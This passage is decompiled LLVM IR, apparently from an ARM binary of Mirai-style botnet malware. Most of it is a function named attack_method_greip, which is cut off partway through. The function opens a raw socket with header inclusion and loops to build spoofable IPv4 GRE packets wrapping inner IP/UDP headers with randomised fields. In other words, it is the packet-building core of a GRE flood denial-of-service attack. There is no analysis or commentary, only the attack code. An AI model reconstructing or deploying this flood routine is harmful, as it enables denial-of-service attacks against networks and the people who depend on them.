  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 12, 11, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 11, 37, 12, 13, 15, 14, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 17, 27, 28, 29, 30, 31, 33, 32, 36, 34, 35, 39, 37, 38, 40, 42, 41, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 8, 9, 10, 11, 12, 13, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a40, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
  uselistorder label %dec_label_pc_983c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_97b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_97b4.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_method_greip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a6c = load i32, i32* @r4, align 4
  %v6_9a6c = load i32, i32* @r5, align 4
  %v24_9a6c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_9a88 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9a8c = load i32, i32* @r5, align 4
  store i32 %v0_9a8c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a9c = load i32, i32* @r4, align 4
  %v5_9aa0 = inttoptr i32 %v0_9a8c to i32*
  %v6_9aa0 = call i32 @attack_get_opt_int(i32 %v0_9a9c, i32* %v5_9aa0, i32 2, i32 0)
  %v1_9aac = urem i32 %v6_9aa0, 256
  store i32 %v1_9aac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9ab8 = load i32, i32* @r5, align 4
  store i32 %v0_9ab8, i32* %r1.global-to-local, align 4
  %v0_9abc = load i32, i32* @r4, align 4
  %v5_9ac0 = trunc i32 %v6_9aa0 to i8
  %v6_9ac4 = inttoptr i32 %v0_9ab8 to i32*
  %v7_9ac4 = call i32 @attack_get_opt_int(i32 %v0_9abc, i32* %v6_9ac4, i32 3, i32 65535)
  %v0_9ac8 = load i32, i32* @r5, align 4
  store i32 %v0_9ac8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9ac4, i32* %fp.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v4_9adc = inttoptr i32 %v0_9ac8 to i32*
  %v5_9adc = call i32 @attack_get_opt_int(i32 %v0_9ad8, i32* %v4_9adc, i32 4, i32 64)
  %v1_9ae4 = urem i32 %v5_9adc, 256
  store i32 %v1_9ae4, i32* %ip.global-to-local, align 4
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9af4 = load i32, i32* @r4, align 4
  %v6_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v7_9afc = call i32 @attack_get_opt_int(i32 %v0_9af4, i32* %v6_9afc, i32 5, i32 1)
  %v1_9b08 = urem i32 %v7_9afc, 256
  store i32 %v1_9b08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9b14 = load i32, i32* @r5, align 4
  store i32 %v0_9b14, i32* %r1.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  %v5_9b20 = inttoptr i32 %v0_9b14 to i32*
  %v6_9b20 = call i32 @attack_get_opt_int(i32 %v0_9b18, i32* %v5_9b20, i32 6, i32 65535)
  %v0_9b28 = load i32, i32* @r5, align 4
  store i32 %v0_9b28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9b20, i32* @r8, align 4
  %v0_9b38 = load i32, i32* @r4, align 4
  %v4_9b3c = inttoptr i32 %v0_9b28 to i32*
  %v5_9b3c = call i32 @attack_get_opt_int(i32 %v0_9b38, i32* %v4_9b3c, i32 7, i32 65535)
  %v0_9b40 = load i32, i32* @r5, align 4
  store i32 %v0_9b40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9b3c, i32* @r7, align 4
  %v0_9b50 = load i32, i32* @r4, align 4
  %v4_9b54 = inttoptr i32 %v0_9b40 to i32*
  %v5_9b54 = call i32 @attack_get_opt_int(i32 %v0_9b50, i32* %v4_9b54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r5, align 4
  store i32 %v0_9b64, i32* %r1.global-to-local, align 4
  %v0_9b68 = load i32, i32* @r4, align 4
  %v4_9b6c = inttoptr i32 %v0_9b64 to i32*
  %v5_9b6c = call i32 @attack_get_opt_int(i32 %v0_9b68, i32* %v4_9b6c, i32 1, i32 1)
  %v1_9b74 = urem i32 %v5_9b6c, 256
  store i32 %v1_9b74, i32* %ip.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b84 = load i32, i32* @r4, align 4
  %v5_9b8c = inttoptr i32 %v0_9b78 to i32*
  %v6_9b8c = call i32 @attack_get_opt_int(i32 %v0_9b84, i32* %v5_9b8c, i32 19, i32 0)
  %v0_9b94 = load i32, i32* @r5, align 4
  store i32 %v0_9b94, i32* %r1.global-to-local, align 4
  %v2_9b98 = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_9b98, i32* %r3.global-to-local, align 4
  store i32 %v6_9b8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9ba4 = load i32, i32* @r4, align 4
  %v4_9ba8 = inttoptr i32 %v0_9b94 to i32*
  %v5_9ba8 = call i32 @attack_get_opt_int(i32 %v0_9ba4, i32* %v4_9ba8, i32 25, i32 %v2_9b98)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9bbc = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9bc0 = icmp eq i32 %v3_9bbc, -1
  store i1 %v7_9bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bc0, label %dec_label_pc_a060, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9bd4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9bd4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9be8 = call i32 @__GI_setsockopt(i32 %v3_9bbc, i32 0, i32 3, i32 %v6_9bd4, i32 4)
  %v7_9bec = icmp eq i32 %v5_9be8, -1
  store i1 %v7_9bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bec, label %dec_label_pc_a058, label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bcc
  %v0_9bf4 = load i32, i32* @r8, align 4
  %v0_9bf8 = load i32, i32* @r7, align 4
  %v0_9bfc = load i32, i32* %fp.global-to-local, align 4
  %v0_9c00 = load i32, i32* @r6, align 4
  %v1_9c00 = urem i32 %v0_9c00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9c08 = urem i32 %v0_9bf4, 65536
  store i32 %v3_9c08, i32* %r3.global-to-local, align 4
  %v3_9c0c = urem i32 %v0_9bf8, 65536
  store i32 %v3_9c0c, i32* %r4.global-to-local, align 4
  %v0_9c10 = load i32, i32* @sl, align 4
  %v2_9c10 = icmp eq i32 %v0_9c10, 0
  store i1 %v2_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9c28 = urem i32 %v0_9bfc, 65536
  store i32 %v3_9c28, i32* @fp, align 4
  br i1 %v2_9c10, label %dec_label_pc_a06c, label %dec_label_pc_9c38

dec_label_pc_9c38:                                ; preds = %dec_label_pc_9bf4
  %v3_9bf8 = mul i32 %v0_9bf8, 65536
  %v3_9bf4 = mul i32 %v0_9bf4, 65536
  %v0_9bfc.not = or i32 %v0_9bfc, -65536
  %v1_9c3c = xor i32 %v0_9bfc.not, 65535
  %v3_9c40 = mul i32 %v5_9b54, 65536
  %v1_9c44 = add i32 %v3_9c40, 3407872
  %tmp67 = udiv i32 %v1_9c44, 256
  %v3_9c58 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9c3c, 256
  %v3_9c5c = and i32 %tmp68, 65280
  store i32 %v3_9c5c, i32* %ip.global-to-local, align 4
  %v1_9c60 = add i32 %v3_9c40, 524288
  %v1_9c68 = add i32 %v3_9c40, 1835008
  %tmp69 = udiv i32 %v1_9c3c, 256
  %v4_9c6c = urem i32 %tmp69, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c5c
  %v4_9c74 = udiv i32 %v1_9c44, 16777216
  %v5_9c74 = or i32 %v3_9c58, %v4_9c74
  store i32 %v5_9c74, i32* @r8, align 4
  %v3_9c80 = udiv i32 %v1_9c68, 256
  %tmp70 = mul i32 %v0_9bfc, 256
  %v3_9c84 = and i32 %tmp70, 65280
  store i32 %v3_9bf4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bfc, 256
  %v4_9c94 = urem i32 %tmp71, 256
  %v5_9c94 = or i32 %v4_9c94, %v3_9c84
  %tmp72 = mul i32 %v0_9bf4, 256
  %v3_9c98 = and i32 %tmp72, 65280
  %v1_9c9c = and i32 %v3_9c80, 65280
  store i32 %v1_9c9c, i32* @r6, align 4
  store i32 %v3_9bf8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bf8, 256
  %v3_9ca8 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bf4, 256
  %v4_9cac = urem i32 %tmp74, 256
  %v5_9cac = or i32 %v4_9cac, %v3_9c98
  store i32 %v5_9cac, i32* @lr, align 4
  %v4_9cb0 = udiv i32 %v1_9c68, 16777216
  %v5_9cb0 = or i32 %v1_9c9c, %v4_9cb0
  store i32 %v5_9cb0, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bf8, 256
  %v4_9cb4 = urem i32 %tmp75, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9ca8
  %tmp76 = udiv i32 %v1_9c60, 256
  %v3_9cb8 = and i32 %tmp76, 65280
  store i32 %v3_9cb8, i32* @r5, align 4
  %v4_9ccc = udiv i32 %v1_9c60, 16777216
  %v5_9ccc = or i32 %v3_9cb8, %v4_9ccc
  store i32 %v5_9ccc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9d20 = sext i8 %v5_9ac0 to i32
  %sext12 = mul nuw i32 %v5_9c94, 65536
  %v4_9d3813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9cb0, 65536
  %v4_9d9c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c6c, 65536
  %v4_9da0 = sdiv i32 %sext9, 65536
  %v1_9da8 = trunc i32 %v4_9d9c to i16
  %v2_9dd0 = icmp eq i32 %v1_9c00, 0
  %sext10 = mul nuw i32 %v5_9cac, 65536
  %v4_9df0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9cb4, 65536
  %v4_9df8 = sdiv i32 %sext11, 65536
  %v1_9d30 = trunc i32 %v5_9adc to i8
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %bb82, %dec_label_pc_9c38
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ce0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_9a88, i32* %r2.global-to-local, align 4
  %v3_9ce8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ce8, i32* %r3.global-to-local, align 4
  %v2_9cec = load i32, i32* @r4, align 4
  %v5_9cec = mul i32 %v2_9cec, 4
  %v6_9cec = add i32 %v5_9cec, %v2_9a88
  %v7_9cec = inttoptr i32 %v6_9cec to i32*
  store i32 %v2_9ce0, i32* %v7_9cec, align 4
  %v0_9cf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cf0 = mul i32 %v1_9cf0, 4
  %v5_9cf0 = add i32 %v4_9cf0, %v0_9cf0
  %v6_9cf0 = inttoptr i32 %v5_9cf0 to i32*
  %v7_9cf0 = load i32, i32* %v6_9cf0, align 4
  store i32 %v7_9cf0, i32* %r4.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v7_9cf0 to i8*
  %v2_9cf4 = load i8, i8* %v1_9cf4, align 1
  %tmp = urem i8 %v2_9cf4, 16
  %v1_9cf8 = zext i8 %tmp to i32
  %v1_9cfc = or i32 %v1_9cf8, 64
  store i32 %v1_9cfc, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v1_9cfc to i8
  store i8 %v1_9d00, i8* %v1_9cf4, align 1
  %v0_9d04 = load i32, i32* %r3.global-to-local, align 4
  %v5_9d08 = mul i32 %v0_9d04, 24
  store i32 %v5_9d08, i32* %r1.global-to-local, align 4
  %v0_9d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d0c = inttoptr i32 %v0_9d0c to i8*
  %v2_9d0c = load i8, i8* %v1_9d0c, align 1
  %v1_9d10 = and i8 %v2_9d0c, -16
  %v1_9d14 = or i8 %v1_9d10, 5
  store i32 %v1_9b08, i32* %r5.global-to-local, align 4
  store i8 %v1_9d14, i8* %v1_9d0c, align 1
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d24 = add i32 %v2_9d24, 1
  %v4_9d24 = inttoptr i32 %v3_9d24 to i8*
  store i8 %v5_9ac0, i8* %v4_9d24, align 1
  store i32 %v1_9ae4, i32* %r3.global-to-local, align 4
  %v0_9d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_9d2c = icmp eq i32 %v0_9d2c, 0
  store i1 %v2_9d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_9d30 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d30 = add i32 %v2_9d30, 8
  %v4_9d30 = inttoptr i32 %v3_9d30 to i8*
  store i8 %v1_9d30, i8* %v4_9d30, align 1
  %v0_9d34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d34, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9cd4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9cd4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  %v3_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v4_9d3c = add i32 %v3_9d3c, 6
  %v5_9d3c = inttoptr i32 %v4_9d3c to i16*
  store i16 64, i16* %v5_9d3c, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d44 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d44 = add i32 %v2_9d44, 9
  %v4_9d44 = inttoptr i32 %v3_9d44 to i8*
  store i8 47, i8* %v4_9d44, align 1
  %v0_9d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d48 = add i32 %v0_9d48, 20
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d50 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d50 = trunc i32 %v0_9d50 to i16
  %v3_9d50 = add i32 %v0_9d48, 4
  %v4_9d50 = inttoptr i32 %v3_9d50 to i16*
  store i16 %v1_9d50, i16* %v4_9d50, align 2
  %v0_9d54 = load i32, i32* @r8, align 4
  %v1_9d54 = trunc i32 %v0_9d54 to i16
  %v2_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d54 = add i32 %v2_9d54, 2
  %v4_9d54 = inttoptr i32 %v3_9d54 to i16*
  store i16 %v1_9d54, i16* %v4_9d54, align 2
  %v0_9d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d58 = trunc i32 %v0_9d58 to i16
  %v2_9d58 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d58 = add i32 %v2_9d58, 2
  %v4_9d58 = inttoptr i32 %v3_9d58 to i16*
  store i16 %v1_9d58, i16* %v4_9d58, align 2
  store i32 %v5_9ba8, i32* %r3.global-to-local, align 4
  %v0_9d60 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d60 = add i32 %v0_9d60, 24
  %v2_9d60 = inttoptr i32 %v1_9d60 to i8*
  %v3_9d60 = load i8, i8* %v2_9d60, align 1
  %v4_9d60 = zext i8 %v3_9d60 to i32
  store i32 %v4_9d60, i32* %r2.global-to-local, align 4
  %v2_9d64 = add i32 %v0_9d60, 12
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v5_9ba8, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d68 = and i32 %v0_9d68, -241
  %v1_9d6c = or i32 %v1_9d68, 64
  store i32 %v1_9d6c, i32* %r2.global-to-local, align 4
  %v0_9d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d70 = load i32, i32* @sb, align 4
  %v2_9d70 = add i32 %v1_9d70, %v0_9d70
  store i32 %v2_9d70, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v2_9d70, 16
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v1_9d6c to i8
  %v2_9d78 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d78 = add i32 %v2_9d78, 24
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d7c = add i32 %v0_9d7c, 24
  %v2_9d7c = inttoptr i32 %v1_9d7c to i8*
  %v3_9d7c = load i8, i8* %v2_9d7c, align 1
  %v1_9d80 = and i8 %v3_9d7c, -16
  %v1_9d84 = or i8 %v1_9d80, 5
  store i8 %v1_9d84, i8* %v2_9d7c, align 1
  %v0_9d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v1_9d8c, 16
  %v3_9d8c = inttoptr i32 %v2_9d8c to i32*
  store i32 %v0_9d8c, i32* %v3_9d8c, align 4
  %v0_9d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d94, 24
  store i32 %v1_9d94, i32* @r5, align 4
  %v3_9d98 = add i32 %v0_9d94, 25
  %v4_9d98 = inttoptr i32 %v3_9d98 to i8*
  store i8 %v5_9ac0, i8* %v4_9d98, align 1
  store i32 %v4_9d9c, i32* %r2.global-to-local, align 4
  store i32 %v4_9da0, i32* %r3.global-to-local, align 4
  store i32 %v1_9ae4, i32* %r1.global-to-local, align 4
  %v2_9da8 = load i32, i32* @r5, align 4
  %v3_9da8 = add i32 %v2_9da8, 2
  %v4_9da8 = inttoptr i32 %v3_9da8 to i16*
  store i16 %v1_9da8, i16* %v4_9da8, align 2
  %v0_9dac = load i32, i32* %r3.global-to-local, align 4
  %v1_9dac = trunc i32 %v0_9dac to i16
  %v2_9dac = load i32, i32* @r5, align 4
  %v3_9dac = add i32 %v2_9dac, 4
  %v4_9dac = inttoptr i32 %v3_9dac to i16*
  store i16 %v1_9dac, i16* %v4_9dac, align 2
  %v0_9db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9db0, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9db8 = trunc i32 %v0_9db8 to i8
  %v2_9db8 = load i32, i32* @r5, align 4
  %v3_9db8 = add i32 %v2_9db8, 8
  %v4_9db8 = inttoptr i32 %v3_9db8 to i8*
  store i8 %v1_9db8, i8* %v4_9db8, align 1
  %v0_9dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dbc, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_9dbc = trunc i32 %v1_9dbc to i16
  %v3_9dbc = load i32, i32* @r5, align 4
  %v4_9dbc = add i32 %v3_9dbc, 6
  %v5_9dbc = inttoptr i32 %v4_9dbc to i16*
  store i16 %v2_9dbc, i16* %v5_9dbc, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i8
  %v2_9dc0 = load i32, i32* @r5, align 4
  %v3_9dc0 = add i32 %v2_9dc0, 9
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i8*
  store i8 %v1_9dc0, i8* %v4_9dc0, align 1
  %v0_9dc4 = call i32 @rand_next()
  store i32 %v1_9c00, i32* %r1.global-to-local, align 4
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9dd4 = sub i32 1023, %v0_9dc4
  store i32 %v1_9dd4, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9ddc = load i32, i32* @r5, align 4
  %v3_9ddc = add i32 %v2_9ddc, 16
  %v4_9ddc = inttoptr i32 %v3_9ddc to i32*
  store i32 %v1_9dd4, i32* %v4_9ddc, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_9dd8 = add i32 %v1_9dd8, 16
  %v3_9dd8 = inttoptr i32 %v2_9dd8 to i32*
  %v4_9dd8 = load i32, i32* %v3_9dd8, align 4
  store i32 %v4_9dd8, i32* %r3.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r5, align 4
  %v3_9de0 = add i32 %v2_9de0, 16
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 %v4_9dd8, i32* %v4_9de0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9de4 = load i32, i32* @r5, align 4
  %v2_9de4 = add i32 %v1_9de4, 12
  %v3_9de4 = inttoptr i32 %v2_9de4 to i32*
  store i32 %v0_9dc4, i32* %v3_9de4, align 4
  %v3_9de8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dec = load i32, i32* %r4.global-to-local, align 4
  %v1_9dec = add i32 %v0_9dec, 44
  store i32 %v1_9dec, i32* @r6, align 4
  store i32 %v4_9df0, i32* %r2.global-to-local, align 4
  %v1_9df4 = add i32 %v3_9de8, 1
  store i32 %v1_9df4, i32* @r4, align 4
  store i32 %v4_9df8, i32* %r3.global-to-local, align 4
  %v1_9dfc = load i32, i32* @sl, align 4
  %v9_9dfc = icmp eq i32 %v1_9df4, %v1_9dfc
  store i1 %v9_9dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_9e00 = load i32, i32* @r7, align 4
  %v1_9e00 = trunc i32 %v0_9e00 to i16
  %v3_9e00 = add i32 %v0_9dec, 48
  %v4_9e00 = inttoptr i32 %v3_9e00 to i16*
  store i16 %v1_9e00, i16* %v4_9e00, align 2
  %v0_9e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e04 = trunc i32 %v0_9e04 to i16
  %v2_9e04 = load i32, i32* @r6, align 4
  %v3_9e04 = inttoptr i32 %v2_9e04 to i16*
  store i16 %v1_9e04, i16* %v3_9e04, align 2
  %v0_9e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e08 = trunc i32 %v0_9e08 to i16
  %v2_9e08 = load i32, i32* @r6, align 4
  %v3_9e08 = add i32 %v2_9e08, 2
  %v4_9e08 = inttoptr i32 %v3_9e08 to i16*
  store i16 %v1_9e08, i16* %v4_9e08, align 2
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* %stack_var_-44, align 4
  %v5_9e10 = icmp slt i32 %v1_9df4, %v1_9dfc
  br i1 %v5_9e10, label %dec_label_pc_9cd4, label %dec_label_pc_9e14

dec_label_pc_9e14:                                ; preds = %bb82
  store i32 %v5_9b54, i32* %r5.global-to-local, align 4
  %v1_9e1c = add i32 %v5_9b54, 8
  store i32 %v1_9e1c, i32* %r4.global-to-local, align 4
  %v0_9e2c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9e28.preheader

dec_label_pc_9e28.preheader:                      ; preds = %dec_label_pc_9e14, %dec_label_pc_a06c
  %v0_9e2c.pre = phi i32 [ %v0_9e2c.pre.pre, %dec_label_pc_9e14 ], [ 0, %dec_label_pc_a06c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9e1c, %dec_label_pc_9e14 ], [ %v1_a074, %dec_label_pc_a06c ]
  %storemerge = add i32 %v5_9b54, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_a020 = icmp eq i32 %v1_9c00, 0
  %v2_a03c = icmp eq i32 %v1_9b74, 0
  %v2_9e68 = icmp eq i32 %v5_9ba8, -1
  %v7_9e68 = icmp eq i32 %v5_9ba8, -1
  br label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9eb8, %dec_label_pc_9e28.preheader
  %v0_9e2c = phi i32 [ %v0_9e2c.pre, %dec_label_pc_9e28.preheader ], [ 0, %dec_label_pc_9e28 ], [ %v1_9f54, %dec_label_pc_9eb8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9e2c = icmp eq i32 %v0_9e2c, 0
  store i1 %v2_9e2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9e2c, label %dec_label_pc_9e28, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e28
  br label %dec_label_pc_9e3c

dec_label_pc_9e3c:                                ; preds = %dec_label_pc_9eb8, %dec_label_pc_9e38
  %v1_9e50 = phi i32 [ %v1_9f50, %dec_label_pc_9eb8 ], [ 0, %dec_label_pc_9e38 ]
  %v5_9e40 = mul i32 %v1_9e50, 24
  %v1_9e44 = load i32, i32* @sb, align 4
  %v2_9e44 = add i32 %v1_9e44, %v5_9e40
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 %v2_9a88, i32* %r4.global-to-local, align 4
  %v1_9e4c = add i32 %v2_9e44, 20
  %v2_9e4c = inttoptr i32 %v1_9e4c to i8*
  %v3_9e4c = load i8, i8* %v2_9e4c, align 1
  %v4_9e4c = zext i8 %v3_9e4c to i32
  store i32 %v4_9e4c, i32* %r2.global-to-local, align 4
  %v4_9e50 = mul i32 %v1_9e50, 4
  %v5_9e50 = add i32 %v4_9e50, %v2_9a88
  %v6_9e50 = inttoptr i32 %v5_9e50 to i32*
  %v7_9e50 = load i32, i32* %v6_9e50, align 4
  store i32 %v7_9e50, i32* @r5, align 4
  %v7_9e54 = icmp eq i8 %v3_9e4c, 31
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v7_9e50, 24
  store i32 %v1_9e58, i32* @r6, align 4
  %v1_9e5c = add i32 %v7_9e50, 44
  store i32 %v1_9e5c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e4c, 32
  br i1 %tmp86, label %dec_label_pc_9f64, label %dec_label_pc_9e64

dec_label_pc_9e64:                                ; preds = %dec_label_pc_9e3c
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
